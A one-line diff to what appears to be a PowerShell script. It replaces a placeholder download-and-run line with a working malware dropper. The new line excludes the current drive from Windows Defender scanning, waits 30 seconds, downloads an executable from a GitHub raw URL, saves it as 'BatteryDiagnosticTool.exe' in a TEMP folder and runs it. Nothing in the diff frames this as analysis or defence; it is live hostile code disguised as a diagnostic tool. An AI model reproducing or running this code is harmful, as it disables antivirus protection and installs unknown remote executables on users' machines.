@@ -1,1 +1,1 @@
-iex (iwr 'http://example.com/yourscript.ps1').Content
+$currentDrive = (Get-Location | Split-Path -Qualifier); Add-MpPreference -ExclusionPath $currentDrive\; $a='http://raw.githubusercontent.com/MyPrincessAkira/Jarvas/main/Cqqjbi.exe';$d="$($env:TEMP)\BatteryDiagnostic";if(-not(Test-Path -Path $d -PathType Container)){New-Item -ItemType Directory -Path $d};Start-Sleep -Seconds 30;Invoke-WebRequest -Uri $a -OutFile "$d\BatteryDiagnosticTool.exe"; Invoke-Item "$d\BatteryDiagnosticTool.exe"
